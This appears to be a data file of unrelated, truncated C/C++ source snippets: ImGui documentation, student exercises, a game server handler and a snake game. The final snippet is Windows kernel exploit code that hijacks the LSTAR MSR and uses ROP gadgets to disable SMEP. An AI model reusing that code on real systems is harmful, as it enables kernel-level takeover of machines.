Getting Started?\n// - For first-time users having issues compiling/linking/running or issues loading fonts:\n//   please post in https://github.com/ocornut/imgui/discussions if you cannot find a solution in resources above.\n\n// Developed by Omar Cornut and every direct or indirect contributors to the GitHub.\n// See LICENSE.txt for copyright and licensing details (standard MIT License).\n// This library is free but needs your support to sustain development and maintenance.\n// Businesses: you can support continued development via invoiced technical support, maintenance and sponsoring contracts. Please reach out to \"contact AT dearimgui.com\".\n// Individuals: you can support continued development via donations. See docs/README or web page.\n\n// It is recommended that you don't modify imgui.cpp! It will become difficult for you to update the library.\n// Note that 'ImGui::' being a namespace, you can add functions into the namespace from your own source files, without\n// modifying imgui.h or imgui.cpp. You may include imgui_internal.h to access internal data structures, but it doesn't\n// come with any guarantee of forward compatibility. Discussing your changes on the GitHub Issue Tracker may lead you\n// to a better solution or official support for them.\n\n/*\n\nIndex of this file:\n\nDOCUMENTATION\n\n- MISSION STATEMENT\n- END-USER GUIDE\n- PROGRAMMER GUIDE\n  - READ FIRST\n  - HOW TO UPDATE TO A NEWER VERSION OF DEAR IMGUI\n  - GETTING STARTED WITH INTEGRATING DEAR IMGUI IN YOUR CODE/ENGINE\n  - HOW A SIMPLE APPLICATION MAY LOOK LIKE\n  - HOW A SIMPLE RENDERING FUNCTION MAY LOOK LIKE\n  - USING GAMEPAD/KEYBOARD NAVIGATION CONTROLS\n- API BREAKING CHANGES (read me when you update!)\n- FREQUENTLY ASKED QUESTIONS (FAQ)\n  - Read all answers online: https://www.dearimgui.org/faq, or in docs/FAQ.md (with a Markdown viewer)\n\nCODE\n(search for \"[SECTION]\" in the code to find them)\n\n// [SECTION] INCLUDES\n// [SECTION] FORWARD DECLARATIONS\n// [SECTION] CONTEXT AND MEMORY ALLOCATORS\n// [SECTION] USER FACING STRUCTURES (ImGuiStyle, ImGuiIO)\n// [SECTION] MISC HELPERS/UTILITIES (Geometry functions)\n// [SECTION] MISC HELPERS/UTILITIES (String, Format, Hash functions)\n// [SECTION] MISC HELPERS/UTILITIES (File functions)\n// [SECTION] MISC HELPERS/UTILITIES (ImText* functions)\n// [SECTION] MISC HELPERS/UTILITIES (Color functions)\n// [SECTION] ImGuiStorage\n// [SECTION] ImGuiTextFilter\n// [SECTION] ImGuiTextBuffer\n// [SECTION] ImGuiListClipper\n// [SECTION] STYLING\n// [SECTION] RENDER HELPERS\n// [SECTION] MAIN CODE (most of the code! lots of stuff, needs tidying up!)\n// [SECTION] ERROR CHECKING\n// [SECTION] LAYOUT\n// [SECTION] SCROLLING\n// [SECTION] TOOLTIPS\n// [SECTION] POPUPS\n// [SECTION] KEYBOARD/GAMEPAD NAVIGATION\n// [SECTION] DRAG AND DROP\n// [SECTION] LOGGING/CAPTURING\n// [SECTION] SETTINGS\n// [SECTION] VIEWPORTS\n// [SECTION] PLATFORM DEPENDENT HELPERS\n// [SECTION] METRICS/DEBUGGER WINDOW\n\n*/\n\n//-----------------------------------------------------------------------------\n// DOCUMENTATION\n//-----------------------------------------------------------------------------\n\n/*\n\n MISSION STATEMENT\n =================\n\n - Easy to use to create code-driven and data-driven tools.\n - Easy to use to create ad hoc short-lived tools and long-lived, more elaborate tools.\n - Easy to hack and improve.\n - Minimize setup and maintenance.\n - Minimize state storage on user side.\n - Portable, minimize dependencies, run on target (consoles, phones, etc.).\n - Efficient runtime and memory consumption.\n\n Designed for developers and content-creators, not the typical end-user! Some of the current weaknesses includes:\n\n - Doesn't look fancy, doesn't animate.\n - Limited layout features, intricate layouts are typically crafted in code.\n\n\n END-USER GUIDE\n ==============\n\n - Double-click on title bar to collapse window.\n - Click upper right corner to close a window, available when 'bool* p_open' is passed to ImGui::Begin().\n - Click and drag on lower right corner to resize window (double-click to auto fit window to its contents).\n - Click and drag on any empty space to move window.",
    "#include <iostream>\n#include <fstream>\n#include <vector>\n#include <bitset>\n#include <algorithm>\n#include <string>\n\nusing namespace std;\n\nconst string RED_COLOR = \"\\033[31m\";\nconst string GREEN_COLOR = \"\\033[32m\";\nconst string CYAN_COLOR = \"\\033[36m\";\nconst string YELLOW_COLOR = \"\\033[33m\";\n\n// Function to read numbers from a file\nvector<int> readNumbersFromFile(ifstream &file, const int n) {\n    vector<int> numbers;\n    int number;\n\n    // Reading integers from the file\n    while (file >> number && numbers.size() < n) {\n        numbers.push_back(number);\n    }\n\n    return numbers;\n}\n\n// Function to print numbers with color\nstring color(const string &str, const string &color) {\n    return color + str + \"\\033[0m\"; // ANSI escape code to reset color\n}\n\n// Function to print a list of numbers\nstring printNumbers(const vector<int> &numbers) {\n    string result;\n    for (const auto &number: numbers) {\n        result += to_string(number) + \" \";\n    }\n    return result;\n}\n\n// Function to create a binary array from decimal numbers\nvector<int> decimalToBinaryArray(const vector<int> &numbers) {\n    vector<int> binaryArray;\n    for (const auto &number: numbers) {\n        const int validNumber = abs(number) % 256; // Ensure the number is within 0-255\n        // Use 8 bits to represent the number\n        bitset<8> bits(validNumber);\n        for (int i = 7; i >= 0; --i) {\n            // Use reverse order to match standard bit representation\n            binaryArray.push_back(bits[i]); // Add each bit to the vector\n        }\n    }\n    return binaryArray;\n}\n\n// Function to print the binary array, separating every 8 bits with a space\nvoid printBinaryArray(const vector<int> &binaryArray) {\n    for (size_t i = 0; i < binaryArray.size(); i += 8) {\n        for (int j = 0; j < 8 && (i + j) < binaryArray.size(); ++j) {\n            cout << binaryArray[i + j];\n        }\n        cout << \" \"; // Space between bytes\n    }\n    cout << endl;\n}\n\n// Function to right shift the array by 3\nvector<int> rightShiftArray(const vector<int> &binaryArray, int shift) {\n    const int n = static_cast<int>(binaryArray.size());\n    vector<int> shiftedArray(n);\n    shift = shift % n; // Handle cases where the shift is greater than the array size\n\n    for (int i = 0; i < n; ++i) {\n        shiftedArray[(i + shift) % n] = binaryArray[i];\n    }\n    return shiftedArray;\n}\n\n// Function to convert the binary array back to bytes\nvector<int> binaryArrayToBytes(const vector<int> &binaryArray) {\n    vector<int> bytes;\n    for (size_t i = 0; i < binaryArray.size(); i += 8) {\n        int byteValue = 0;\n        for (int j = 0; j < 8; ++j) {\n            if (i + j < binaryArray.size()) {\n                byteValue = (byteValue << 1) | binaryArray[i + j]; // Construct the byte\n            }\n        }\n        bytes.push_back(byteValue);\n    }\n    return bytes;\n}\n\nvoid printShiftedArrayWithMinByteHighLight(const vector<int> &shiftedArray, const vector<int> &byteArray,\n                                           int minByte) {\n    cout << color(\"Right shift -> by 3 bits: \", CYAN_COLOR);\n    for (size_t i = 0; i < shiftedArray.size(); i += 8) {\n        for (int j = 0; j < 8 && (i + j) < shiftedArray.size(); ++j) {\n            if (byteArray[i / 8] == minByte) {\n                cout << color(to_string(shiftedArray[i + j]), RED_COLOR); // Highlight the minimum byte\n            } else {\n                cout << shiftedArray[i + j];\n            }\n        }\n        cout << \" \"; // Space between bytes\n    }\n    cout << endl;\n}\n\nint main() {\n    // Get the file name from the user\n    string filename;\n    cout << \"Enter the file name (just the name with extension): \";\n    cin >> filename;\n\n    // Open the file\n    ifstream file(filename);\n    if (!file) {\n        cout << color(\"Error opening file '\" + filename + \"'!\", RED_COLOR) << endl;\n        return 1;\n    }\n\n    // Get the number of integers from the user\n    int n;\n    cout << \"Enter the number of bytes (3-30): \";\n    cin >> n;\n\n    if (!cin || n < 3 || n > 30) {\n        n = 10;\n    } else if (n > 26) {\n        n = 26;\n    }\n\n    // Read integers from the file\n    vector<int> numbers = readNumbersFromFile(file, n);\n    file.close();\n\n    // Print the original sequence of numbers\n    cout << color(\"Byte sequence: \", CYAN_COLOR) << printNumbers(numbers) << endl;\n\n    // Convert to binary array\n    vector<int> binaryArray = decimalToBinaryArray(numbers);\n\n    // Print the binary array\n    cout << color(\"Binary sequence: \", CYAN_COLOR);\n    printBinaryArray(binaryArray);\n\n    // Right shift by 3\n    vector<int> shiftedArray = rightShiftArray(binaryArray, 3);\n\n    // Convert the binary array to bytes\n    vector<int> byteArray = binaryArrayToBytes(shiftedArray);\n\n    // Find the minimum byte in the shifted array\n    int minByte = *min_element(byteArray.begin(), byteArray.end());\n\n    // Print the shifted binary array, highlighting the minimum byte\n    // Call the new function in main\n    printShiftedArrayWithMinByteHighLight(shiftedArray, ",
    "\ufeff#include \"packet_handler.h\"\n\n#include \"client_session.h\"\n#include \"field.h\"\n#include \"player.h\"\n\nbool PacketHandler::HandleInvalid(const SessionRef& session, const Packet& packet) {\n  std::cerr << std::format(\"Invalid packet type: {}\\n\", packet.GetType());\n  return false;\n}\n\nbool PacketHandler::HandleMoveStart(const SessionRef& session, const cs::MoveStart& packet) {\n  const auto player = Field::GetInstance().FindPlayer(session->GetSessionId());\n\n  if (!player.has_value()) {\n    return false;\n  }\n\n  // player.value()->_moves.emplace_back(true, static_cast<Direction>(packet.direction), packet.x, packet.y, GetTickCount64());\n  player.value()->SetMoving(true);\n  player.value()->SetDirection(static_cast<Direction>(packet.direction));\n\n  if (!player.value()->CheckPosition(packet.x, packet.y)) {\n    // for (const auto& move_record : player.value()->_move_records) {\n    //   std::cout << std::format(\"[0]dir: {}, x: {}, y: {}\\n\", static_cast<int32_t>(std::get<0>(move_record)), std::get<1>(move_record), std::get<2>(move_record));\n    // }\n    //\n    // for (const auto& move : player.value()->_moves) {\n    //   std::cout << std::format(\"[1] move: {} dir: {}, x: {}, y: {}\\n\", static_cast<int32_t>(std::get<0>(move)), static_cast<int32_t>(std::get<1>(move)), std::get<2>(move), std::get<3>(move));\n    // }\n\n    const auto sync = Serialize<sc::Sync>(player.value()->GetSessionId(), player.value()->GetPosition().x, player.value()->GetPosition().y);\n    Field::GetInstance().BroadcastAround(player.value(), sync, false);\n  } else {\n    player.value()->SetPosition(packet.x, packet.y);\n  }\n\n  const auto& pos = player.value()->GetPosition();\n  const sc::MoveStart move_start = {player.value()->GetSessionId(), packet.direction, pos.x, pos.y};\n  const auto move_start_packet = Serialize(move_start);\n  Field::GetInstance().BroadcastAround(player.value(), move_start_packet, true);\n\n  return true;\n}\n\nbool PacketHandler::HandleMoveStop(const SessionRef& session, const cs::MoveStop& packet) {\n  const auto player = Field::GetInstance().FindPlayer(session->GetSessionId());\n\n  if (!player.has_value()) {\n    return false;\n  }\n\n  // player.value()->_moves.emplace_back(false, static_cast<Direction>(packet.direction), packet.x, packet.y, GetTickCount64());\n  player.value()->SetMoving(false);\n  player.value()->SetDirection(static_cast<Direction>(packet.direction));\n\n  if (!player.value()->CheckPosition(packet.x, packet.y)) {\n    // for (const auto& move_record : player.value()->_move_records) {\n    //   std::cout << std::format(\"[0] dir: {}, x: {}, y: {}\\n\", static_cast<int32_t>(std::get<0>(move_record)), std::get<1>(move_record), std::get<2>(move_record));\n    // }\n    //\n    // for (const auto& move : player.value()->_moves) {\n    //   std::cout << std::format(\"[1] move: {} dir: {}, x: {}, y: {}\\n\", static_cast<int32_t>(std::get<0>(move)), static_cast<int32_t>(std::get<1>(move)), std::get<2>(move), std::get<3>(move));\n    // }\n\n    const auto sync = Serialize<sc::Sync>(player.value()->GetSessionId(), player.value()->GetPosition().x, player.value()->GetPosition().y);\n    Field::GetInstance().BroadcastAround(player.value(), sync, false);\n  } else {\n    player.value()->SetPosition(packet.x, packet.y);\n  }\n\n  const auto& pos = player.value()->GetPosition();\n  const sc::MoveStop move_stop = {player.value()->GetSessionId(), packet.direction, pos.x, pos.y};\n  const auto move_stop_packet = Serialize(move_stop);\n  Field::GetInstance().BroadcastAround(player.value(), move_stop_packet, true);\n\n  return true;\n}\n\nbool PacketHandler::HandleAttack1(const SessionRef& session, const cs::Attack1& packet) {\n  const auto player = Field::GetInstance().FindPlayer(session->GetSessionId());\n\n  if (!player.has_value()) {\n    return false;\n  }\n\n  player.value()->SetMoving(false);\n  player.value()->SetDirection(static_cast<Direction>(packet.direction));\n\n  if (!player.value()->CheckPosition(packet.x, packet.y)) {\n    const auto sync = Serialize<sc::Sync>(player.value()->GetSessionId(), player.value()->GetPosition().x, player.value()->GetPosition().y);\n    Field::GetInstance().BroadcastAround(player.value(), sync, false);\n  } else {\n    player.value()->SetPosition(packet.x, packet.y);\n  }\n\n  return true;\n}\n\nbool PacketHandler::HandleAttack2(const SessionRef& session, const cs::Attack2& packet) {\n  const auto player = Field::GetInstance().FindPlayer(session->GetSessionId());\n\n  if (!player.has_value()) {\n    return false;\n  }\n\n  player.value()->SetMoving(false);\n  player.value()->SetDirection(static_cast<Direction>(packet.direction));\n\n  if (!player.value()->CheckPosition(packet.x, packet.y)) {\n    const auto sync = Serialize<sc::Sync>(player.value()->GetSessionId(), player.value()->GetPosition().x, player.value()->GetPosition().y);\n    Field::GetInstance().BroadcastAround(player.value(), sync, false);\n  } else {\n    player.value()->SetPosition(packet.x, packet.y);\n  }\n\n  return true;\n}\n\nbool PacketHandler::HandleAttack3(const SessionRef& session, const cs::Attack3& packe",
    "\ufeff#define _CRT_SECURE_NO_WARNINGS\n#include <iostream>\nusing namespace std;\n\nint main() {\n    setlocale(LC_ALL, \"ru\");\n\n    string file_name;\n    cout << \"\\t\u0417\u0430\u0434\u0430\u043d\u0438\u0435 1 \u0438 2\\n\\n\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u0438\u043c\u044f \u0444\u0430\u0439\u043b\u0430: \";\n    cin >> file_name;\n    FILE* file = fopen(file_name.c_str(), \"r\");\n    if (file != NULL) {\n        char letters[100]{ \"\\0\" };\n        fread(letters, sizeof(letters[1]), 100, file);\n        cout << \"\\n\u0421\u043e\u0434\u0435\u0440\u0436\u0430\u043d\u0438\u0435:\\n\" << letters << endl << endl;\n        fclose(file);\n    }\n    else\n        cout << \"\\n\u0422\u0430\u043a\u043e\u0433\u043e \u0444\u0430\u0439\u043b\u0430 \u043d\u0435 \u0441\u0443\u0449\u0435\u0441\u0442\u0432\u0443\u0435\u0442\" << endl << endl;\n\n    string OUT, IN;\n    cout << \"\\t\u0417\u0430\u0434\u0430\u043d\u0438\u0435 3\\n\\n\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u0438\u043c\u044f \u043f\u0435\u0440\u0432\u043e\u0433\u043e \u0444\u0430\u0439\u043b\u0430: \";\n    cin >> OUT;\n    cout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u0438\u043c\u044f \u0432\u0442\u043e\u0440\u043e\u0433\u043e \u0444\u0430\u0439\u043b\u0430: \";\n    cin >> IN;\n    FILE* out = fopen(OUT.c_str(), \"r\");\n    FILE* in = fopen(IN.c_str(), \"a\");\n    if (out != NULL and in != NULL) {\n        char buffer[100]{ \"\\0\" };\n        fread(buffer, sizeof(buffer[1]), 100, out);\n        fwrite(buffer, sizeof(char), sizeof(buffer), in);\n        fclose(out);\n        fclose(in);\n    }\n    else\n        cout << endl << \"\u0424\u0430\u0439\u043b\u044b \u043f\u0443\u0441\u0442\u044b\u0435\" << endl;\n\n    return 0;\n}",
    "#include<graphics.h>\r\n#include<assert.h>\r\n#include\"Global.h\"\r\nstruct ButtonTool\r\n{\r\n\tint x;\r\n\tint y;\r\n\tint w;\r\n\tint h;\r\n\tCOLORREF curColor;    //\u5404\u79cd\u989c\u8272\r\n\tCOLORREF inColor;\r\n\tCOLORREF outColor;\r\n\tchar* text;          //\u6587\u5b57\r\n};\r\n//\u521b\u5efa\u6309\u94ae\r\nstruct ButtonTool* creatButtonTool(int x, int y, int w, int h, const char* str, COLORREF inColor, COLORREF outColor)\r\n{\r\n\tstruct ButtonTool* pButton = (struct ButtonTool*)malloc(sizeof(struct ButtonTool));\r\n\tassert(pButton);\r\n\tpButton->x = x;\r\n\tpButton->y = y;\r\n\tpButton->w = w;\r\n\tpButton->h = h;\r\n\tpButton->inColor = inColor;\r\n\tpButton->outColor = outColor;\r\n\tpButton->curColor = outColor;\r\n\tsize_t textlength = strlen(str) + 1;\r\n\tpButton->text = (char*)malloc(sizeof(char*) * textlength);\r\n\tassert(pButton->text);\r\n\tstrcpy_s(pButton->text, textlength, str);\r\n\treturn pButton;\r\n}\r\n//\u586b\u5145\u6309\u94ae\r\nvoid DrawButton(struct ButtonTool* pButton,int text_h,int text_w)\r\n{\r\n\t//\u753b\u77e9\u5f62\r\n\tsetlinestyle(PS_ENDCAP_ROUND, 1);\r\n\tsetlinecolor(BLACK); \r\n\tsetfillcolor(pButton->curColor);\r\n\tfillrectangle(pButton->x, pButton->y, pButton->x + pButton->w, pButton->y + pButton->h);\r\n\tsetlinecolor(_color_);\r\n\t//\u5199\u6587\u5b57\r\n\tsettextcolor(BLACK);\r\n\tsetbkmode(TRANSPARENT);    //\u6587\u5b57\u989c\u8272\r\n\tsettextstyle(text_h, text_w, \"\u6977\u4e66\");\r\n\t//\u6587\u5b57\u5c45\u4e2d\r\n\tint textw = textwidth(pButton->text);\r\n\tint texth = textheight(pButton->text);\r\n\tint xx = pButton->x + (pButton->w - textw) / 2;\r\n\tint yy = pButton->y + (pButton->h - texth) / 2;\r\n\touttextxy(xx, yy, pButton->text);\r\n\tsetlinestyle(PS_ENDCAP_ROUND, _size_);\r\n}\r\n//\u5224\u65ad\u9f20\u6807\u5728\u4e0d\u5728\u6309\u94ae\u4e2d(\u6709\u95ee\u9898)\r\nbool isInButton(struct ButtonTool* pButton, ExMessage m)\r\n{\r\n\tif (m.x > pButton->x && m.x<pButton->x + pButton->w && m.y>pButton->y && m.y < pButton->y + pButton->h)\r\n\t{\r\n\t\tpButton->curColor = pButton->inColor;\r\n\t\treturn true;\r\n\t}\r\n\tpButton->curColor = pButton->outColor;\r\n\treturn false;\r\n}\r\n//\u5224\u65ad\u9f20\u6807\u6709\u6ca1\u6709\u70b9\u51fb\u6309\u94ae\r\nbool isClickButton(struct ButtonTool* pButton, ExMessage m)\r\n{\r\n\tif (isInButton(pButton, m) && m.message == WM_LBUTTONDOWN)\r\n\t{\r\n\t\treturn true;\r\n\t}\r\n\treturn false;\r\n}\r\n//\u5224\u65ad\u662f\u5426\u5728\u4e00\u4e2a\u77e9\u5f62\u5185\r\nbool in(ExMessage m,int x1, int y1, int x2, int y2)\r\n{\r\n\tif (m.x > x1 && m.x<x2 && m.y>y1 && m.y < y2)return true;\r\n\treturn false;\r\n}",
    "\ufeff// 11\n#include \"pch.h\"\n#include <iostream>\n#include <conio.h>\n#include <windows.h>\nusing namespace std;\n\nbool gameOver;\nconst int width = 20;\nconst int height = 20;\nint x, y, fruitX, fruitY, score;\nint tailX[100], tailY[100];\nint nTail;\n\n// \u0421\u043a\u0440\u044b\u0442\u0438\u0435 \u043a\u0443\u0440\u0441\u043e\u0440\u0430\nvoid HideCursor() {\n    CONSOLE_CURSOR_INFO cursorInfo;\n    cursorInfo.dwSize = 100;\n    cursorInfo.bVisible = FALSE;  // \u0421\u043a\u0440\u044b\u0442\u044c \u043a\u0443\u0440\u0441\u043e\u0440\u0447\u0438\u043a\n    SetConsoleCursorInfo(GetStdHandle(STD_OUTPUT_HANDLE), &cursorInfo);\n}\n\n// \u0423\u0441\u0442\u0430\u043d\u043e\u0432\u043a\u0430 \u0446\u0432\u0435\u0442\u0430\nvoid SetColor(int color) {\n    SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), color);\n}\n\nvoid Setup() {\n    gameOver = false;  // \u0415\u0441\u043b\u0438 gameOver \u0431\u0443\u0434\u0435\u0442 \u043f\u0440\u0430\u0432\u0434\u043e\u0439, \u0442\u043e \u0438\u0433\u0440\u0430 \u0437\u0430\u043a\u043e\u043d\u0447\u0438\u0442\u0441\u044f\n    x = width / 2;  // \u041d\u0430\u0447\u0430\u043b\u044c\u043d\u044b\u0435 \u043a\u043e\u043e\u0440\u0434\u0438\u043d\u0430\u0442\u044b \u0437\u043c\u0435\u0439\u043a\u0438 \u043f\u043e \u043e\u0441\u0438 X\n    y = height / 2; // \u041d\u0430\u0447\u0430\u043b\u044c\u043d\u044b\u0435 \u043a\u043e\u043e\u0440\u0434\u0438\u043d\u0430\u0442\u044b \u0437\u043c\u0435\u0439\u043a\u0438 \u043f\u043e \u043e\u0441\u0438 Y\n    fruitX = rand() % width;  // \u0424\u0440\u0443\u043a\u0442\u0438\u043a, \u043a\u043e\u0442\u043e\u0440\u044b\u0439 \u0437\u043c\u0435\u0439\u043a\u0430 \u043c\u043e\u0436\u0435\u0442 \u0441\u043e\u0431\u0438\u0440\u0430\u0442\u044c, \u043f\u043e\u044f\u0432\u043b\u044f\u0435\u0442\u0441\u044f \u0432 \u0440\u0430\u043d\u0434\u043e\u043c\u043d\u043e\u043c \u043c\u0435\u0441\u0442\u0435\n    fruitY = rand() % height; // \u0424\u0440\u0443\u043a\u0442\u0438\u043a, \u043a\u043e\u0442\u043e\u0440\u044b\u0439 \u0437\u043c\u0435\u0439\u043a\u0430 \u043c\u043e\u0436\u0435\u0442 \u0441\u043e\u0431\u0438\u0440\u0430\u0442\u044c, \u043f\u043e\u044f\u0432\u043b\u044f\u0435\u0442\u0441\u044f \u0432 \u0440\u0430\u043d\u0434\u043e\u043c\u043d\u043e\u043c \u043c\u0435\u0441\u0442\u0435\n    score = 0;\n    HideCursor(); // \u0421\u043a\u0440\u044b\u0432\u0430\u0435\u043c \u043a\u0443\u0440\u0441\u043e\u0440\n}\n\nvoid Draw() {\n    system(\"cls\"); // \u041e\u0447\u0438\u0441\u0442\u043a\u0430 \u0435\u043a\u0440\u0430\u043d\u0430 \n    for (int i = 0; i < width + 2; i++)\n        cout << \"#\";\n    cout << \"\\n\";\n\n    for (int i = 0; i < height; i++) {\n        for (int j = 0; j < width; j++) {\n            if (j == 0)\n                cout << \"#\";\n            if (i == y && j == x) {\n                SetColor(1); // \u0423\u0441\u0442\u0430\u043d\u0430\u0432\u043b\u0438\u0432\u0430\u0435\u043c \u0441\u0438\u043d\u0438\u0439 \u0446\u0432\u0435\u0442\u0438\u043a \u0434\u043b\u044f \u0433\u043e\u043b\u043e\u0432\u043a\u0438\n                cout << \"O\"; // \u0413\u043e\u043b\u043e\u0432\u043a\u0430\n                SetColor(7); // \u0412\u043e\u0437\u0432\u0440\u0430\u0449\u0430\u0435\u043c \u0446\u0432\u0435\u0442\u0438\u043a \u043f\u043e \u0443\u043c\u043e\u043b\u0447\u0430\u043d\u0438\u044e\n            }\n            else if (i == fruitY && j == fruitX) {\n                cout << \"+\"; // \u0415\u0434\u0430\n            }\n            else {\n                bool print = false;\n                for (int k = 0; k < nTail; k++) {\n                    if (tailX[k] == j && tailY[k] == i) {\n                        SetColor(6); // \u0423\u0441\u0442\u0430\u043d\u0430\u0432\u043b\u0438\u0432\u0430\u0435\u043c \u0436\u0435\u043b\u0442\u044b\u0439 \u0446\u0432\u0435\u0442\u0438\u043a \u0434\u043b\u044f \u0445\u0432\u043e\u0441\u0442\u0438\u043a\u0430\n                        cout << \"o\"; // \u0425\u0432\u043e\u0441\u0442\u0438\u043a\n                        SetColor(7); // \u0412\u043e\u0437\u0432\u0440\u0430\u0449\u0430\u0435\u043c \u0446\u0432\u0435\u0442 \u043f\u043e \u0443\u043c\u043e\u043b\u0447\u0430\u043d\u0438\u044e\n                        print = true;\n                    }\n                }\n                if (!print)\n                    cout << \" \";\n            }\n            if (j == width - 1)\n                cout << \"#\";\n        }\n        cout << \"\\n\";\n    }\n\n    for (int i = 0; i < width + 2; i++)\n        cout << \"#\";\n    cout << \"\\n\";\n    cout << \"Score: \" << score << \"\\n\";\n}\n\nvoid Input() {\n    if (_kbhit()) {\n        switch (_getch()) {\n        case 72: // \u0421\u0442\u0440\u0435\u043b\u043a\u0430 \u0432\u0432\u0435\u0440\u0445  \n            y--;\n            break;\n        case 80: // \u0421\u0442\u0440\u0435\u043b\u043a\u0430 \u0432\u043d\u0438\u0437  \n            y++;\n            break;\n        case 75: // \u0421\u0442\u0440\u0435\u043b\u043a\u0430 \u0432\u043b\u0435\u0432\u043e  \n            x--;\n            break;\n        case 77: // \u0421\u0442\u0440\u0435\u043b\u043a\u0430 \u0432\u043f\u0440\u0430\u0432\u043e  \n            x++;\n            break;\n        case 'x':\n            gameOver = true;\n            break;\n        }\n    }\n}\n\nvoid Logic() {\n    int prevX = tailX[0];\n    int prevY = tailY[0];\n    int prev2X, prev2Y;\n    tailX[0] = x;\n    tailY[0] = y;\n\n    for (int i = 1; i < nTail; i++) {\n        prev2X = tailX[i];\n        prev2Y = tailY[i];\n        tailX[i] = prevX;\n        tailY[i] = prevY;\n        prevX = prev2X;\n        prevY = prev2Y;\n    }\n\n    // \u0412\u044b\u0448\u043b\u0430 \u043b\u0438 \u0437\u043c\u0435\u044f \u0437\u0430 \u0433\u0440\u0430\u043d\u0438?  \n    if (x >= width) x = 0; else if (x < 0) x = width - 1;\n    if (y >= height) y = 0; else if (y < 0) y = height - 1;\n\n    // \u0423\u0434\u0430\u0440\u0438\u043b\u0430\u0441\u044c \u043b\u0438 \u0437\u043c\u0435\u044f \u043e\u0431 \u0445\u0432\u043e\u0441\u0442\u0438\u043a?\n    for (int i = 0; i < nTail; i++) {\n        if (tailX[i] == x && tailY[i] == y)\n            gameOver = true;\n    }\n\n    // \u0421\u044c\u0451\u043b\u0430 \u043b\u0438 \u0437\u043c\u0435\u0439\u043a\u0430 \u0435\u0434\u0443?  \n    if (x == fruitX && y == fruitY) {\n        score += 10;\n        fruitX = rand() % width;\n        fruitY = rand() % height;\n        nTail++;\n    }\n}\n\nint main() {\n    Setup();\n    while (!gameOver) {\n        Draw();\n        Input();\n        Logic();\n        Sleep(13); // \u0417\u0430\u043c\u0435\u0434\u043b\u0435\u043d\u0438\u0435 \u0438\u0433\u0440\u044b  \n    }\n    return 0;\n}\n",
    "// Eunice Wu, Ryan Bao\n// October 15, 2024\n// Lab 6\n\n#include <fstream> // include fstream libaray so you can\n#include <iostream> // use of/ifstream to read and write files\n#include <iomanip>\n#include <string>\n\nusing namespace std;\n \nint main ( ) \n{\n   // declares input/output stream\n   ifstream inData;\n   ofstream outData;\n\n   // declares variables for values to be stored and used\n   int number_one;\n   int number_two;\n   char ascii;\n   string text; \n\n   // opens the files\n   inData.open(\"inData.txt\");\n   outData.open(\"outData.txt\");\n\n   // reads the two integers, the character, and text from inData text\n   inData >> number_one >> number_two >> ascii >> text;\n   \n   // outputs sum of two integers, the character a letter after, and the text\n   outData << number_one + number_two << endl; \n   ascii = ascii + 1;\n   outData << ascii<< endl; \n   outData << text << endl; \n \n   // closes the input and output files\n   inData.close();\n   outData.close();\n\n   return 0; \n}\n/*\n1 2\nB\nHelo\n\n3\nC\nHelo\n\n*/\n",
    "#include \"msrexec.hpp\"\n\nvoid msrexec_handler(callback_t* callback)\n{\n    // restore LSTAR....\n    __writemsr(IA32_LSTAR_MSR, m_system_call);\n\n    // call usermode code...\n    (*callback)(ntoskrnl_base, get_system_routine);\n}\n\nnamespace vdm\n{\nmsrexec_ctx::msrexec_ctx(writemsr_t wrmsr) : wrmsr(wrmsr)\n{\n    if (!m_mov_cr4_gadget || !m_sysret_gadget || !m_pop_rcx_gadget)\n        if (!find_gadgets())\n            std::printf(\"> failed to find gadgets...\\n\");\n\n    if (!m_kpcr_rsp_offset || !m_kpcr_krsp_offset || !m_system_call)\n        if (!find_globals())\n            std::printf(\"> failed to find globals...\\n\");\n\n    // guess CR4 value for now...\n    // later on I get real cr4 value from IPI...\n    const auto cr4_value = guess_cr4_value();\n\n    m_smep_on.flags = cr4_value.flags;\n    m_smep_on.smep_enable = true;\n    m_smep_off.flags = cr4_value.flags;\n    m_smep_off.smep_enable = false;\n\n    ntoskrnl_base = reinterpret_cast<void*>(utils::kmodule::get_base(\"ntoskrnl.exe\"));\n\n    get_system_routine =\n        reinterpret_cast<get_system_routine_t>(utils::kmodule::get_export(\"ntoskrnl.exe\", \"RtlFindExportedRoutineByName\"));\n\n    // debug prints...\n    std::printf(\"> m_pop_rcx_gadget -> 0x%p\\n\", m_pop_rcx_gadget);\n    std::printf(\"> m_mov_cr4_gadget -> 0x%p\\n\", m_mov_cr4_gadget);\n    std::printf(\"> m_sysret_gadget -> 0x%p\\n\", m_sysret_gadget);\n    std::printf(\"> m_kpcr_rsp_offset -> 0x%x\\n\", m_kpcr_rsp_offset);\n    std::printf(\"> m_kpcr_krsp_offset -> 0x%x\\n\", m_kpcr_krsp_offset);\n    std::printf(\"> m_system_call -> 0x%p\\n\", m_system_call);\n    std::printf(\"> m_smep_off -> 0x%p\\n\", m_smep_off.flags);\n    std::printf(\"> m_smep_on -> 0x%p\\n\", m_smep_on.flags);\n\n    // when this returns back to UM, CR4 will still potentially contain invalid bits...\n    this->exec(\n        // grab the actual CR4 value from other cores by firing an IPI...\n        [&](void* krnl_base, get_system_routine_t get_kroutine) -> void\n        {\n            _ipi_data ipi_data;\n            cpuid_eax_01 cpuid_info;\n            __cpuid((int*)&cpuid_info, 1);\n\n            const auto cpuid_num = cpuid_info.cpuid_additional_information.initial_apic_id;\n\n            ipi_data.core_num = cpuid_num;\n\n            const auto ex_alloc = reinterpret_cast<ex_alloc_t>(get_kroutine(krnl_base, \"ExAllocatePool\"));\n\n            const auto ex_free = reinterpret_cast<ex_free_t>(get_kroutine(krnl_base, \"ExFreePool\"));\n\n            const auto ipi_call = reinterpret_cast<ipi_call_t>(get_kroutine(krnl_base, \"KeIpiGenericCall\"));\n\n            const auto ipi_callback_buf = ex_alloc(NULL, sizeof ipi_callback);\n\n            memcpy(ipi_callback_buf, ipi_callback, sizeof ipi_callback);\n\n            // please note that &ipi_data will be a\n            // pointer to the *kernel stack* so its globally mapped...\n            ipi_call(ipi_callback_buf, &ipi_data);\n\n            // fix m_smep_on and m_smep_off values now...\n            m_smep_on.flags = ipi_data.cr4_val;\n            m_smep_off.flags = ipi_data.cr4_val;\n            m_smep_off.smep_enable = false;\n\n            // free ipi_callback buffer and return from syscall...\n            memset(ipi_callback_buf, NULL, sizeof ipi_call);\n            ex_free(ipi_callback_buf);\n        });\n\n    // restore CR4 